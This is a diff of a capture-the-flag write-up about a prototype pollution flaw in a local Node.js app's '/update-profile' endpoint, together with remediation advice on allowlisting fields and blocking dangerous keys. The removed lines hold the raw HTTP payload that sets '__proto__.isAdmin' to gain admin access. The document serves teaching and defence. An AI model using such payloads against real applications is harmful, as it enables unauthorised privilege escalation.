@@ -1,31 +1,23 @@
-Prototype Pollution
+# How to Hack it
 
-https://chatgpt.com/c/67b33e1d-ff00-8007-97a3-313a08ec0e6a
+The app in this challenge is vulnerable to Prototype Pollution. The '/update-profile' endpoint allows users to send arbitrary JSON in the request body. This data is merged directly into the user object using a custom 'merge()' function with no filtering.
 
+And here's the problem:
 
-POST /update-profile HTTP/1.1
-Host: localhost:3000
-Cookie: username=guest
-Content-Type: application/json
-Content-Length: 42
+The 'merge()' function doesn't check for dangerous keys like '__proto__', meaning we can pollute the global object prototype.
 
-{
-    "__proto__": { "isAdmin": true }
-}
+How?
 
+1️⃣ Send a 'GET /admin' with a cookie 'username=guest'(simulates being logged in) and notice that you get a '403 Forbidden'
 
-then:
+2️⃣ Abuse the prototype pollution vulnerability to make our 'guest' user an admin (see first screenshot)
 
-GET /admin HTTP/1.1
-Cookie: username=guest
-Host: localhost:3000
+3️⃣ Visit '/admin' again and notice that we now get a '200 OK' (see second screenshot)
 
-normal request to update profile would be:
+# My Solution
 
-POST /update-profile HTTP/1.1
-Host: localhost:3000
-Cookie: username=guest
-Content-Type: application/json
-Content-Length: 88
+To remediate the Prototype Pollution issue, the best approach is to avoid merging untrusted input directly into application objects. Instead, explicitly define which fields are allowed and assign them one by one.
 
-{"password": "newPassword", "role": "admin", "profile": "Updated profile descriptioasd"}
+If merging is absolutely necessary, you must block dangerous keys like '__proto__', 'constructor', and 'prototype' during the process. See the attached snippet for an example of how to implement this kind of filtering.
+
+That said, relying on blocklists is generally considered a bad practice and should be avoided where possible.
